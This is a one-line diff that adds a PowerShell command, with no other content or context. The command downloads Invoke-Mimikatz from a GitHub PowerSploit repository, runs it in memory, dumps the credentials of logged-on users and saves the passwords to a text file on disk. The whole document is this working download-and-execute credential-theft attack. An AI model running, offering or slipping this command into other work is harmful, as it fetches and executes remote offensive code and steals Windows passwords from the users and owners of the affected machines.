@@ -1,0 +1,1 @@
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kiranshirali/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds | Out-File C:\\Users\\logged_on_passwords.txt
